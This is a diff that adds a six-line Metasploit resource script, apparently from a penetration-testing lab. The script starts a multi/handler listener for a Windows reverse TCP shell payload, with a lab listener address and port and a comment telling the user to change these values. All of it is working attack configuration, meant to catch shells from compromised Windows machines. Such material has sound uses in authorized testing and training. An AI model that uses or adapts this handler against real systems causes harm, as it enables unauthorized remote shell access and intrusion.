@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+##### CHANGE THESE VALUES ####
+set LHOST 10.11.0.132
+set LPORT 1355
+exploit
